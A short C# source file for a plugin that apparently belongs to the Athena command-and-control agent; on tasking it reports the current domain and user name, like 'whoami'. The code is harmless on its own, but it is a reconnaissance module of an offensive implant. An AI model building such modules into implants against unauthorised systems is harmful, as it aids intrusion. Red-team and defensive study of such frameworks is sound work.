using System;
using System.Collections.Generic;
using PluginBase;

namespace Plugins
{
    public class Plugin : AthenaPlugin
    {
        public override void Execute(Dictionary<string, object> args)
        {
            PluginHandler.AddResponse(new ResponseResult()
            {
                task_id = (string)args["task-id"],
                user_output = $"{Environment.UserDomainName}\\{Environment.UserName}",
                completed = "true"
            });
        }
    }
}
